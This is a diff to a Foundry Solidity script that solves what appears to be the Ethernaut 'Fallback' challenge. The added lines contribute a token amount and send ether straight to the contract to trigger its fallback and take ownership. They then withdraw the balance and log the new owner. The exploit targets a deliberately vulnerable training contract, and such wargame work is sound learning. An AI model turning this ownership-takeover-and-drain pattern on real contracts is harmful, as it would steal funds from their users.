@@ -20,7 +20,7 @@ contract FallbackScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Fallback(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Fallback(payable(0x0000000000000000000000000000000000000000)); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +32,7 @@ contract FallbackScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Fallback();
+            target = new Fallback();
             vm.stopBroadcast();
         }
     }
@@ -44,5 +44,17 @@ contract FallbackScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+
+        console.log("[Exploiting...]");
+        vm.startBroadcast(attacker);
+        target.contribute{value:1}();
+        console.log("contribute: ", target.getContribution());
+        (bool sent, ) = address(target).call{value: 1}("");
+        require(sent, "Failed to send Ether");
+        target.withdraw();
+        vm.stopBroadcast();
+
+        console.log("[Verify]");
+        console.log("owner: ", target.owner());
     }
 }
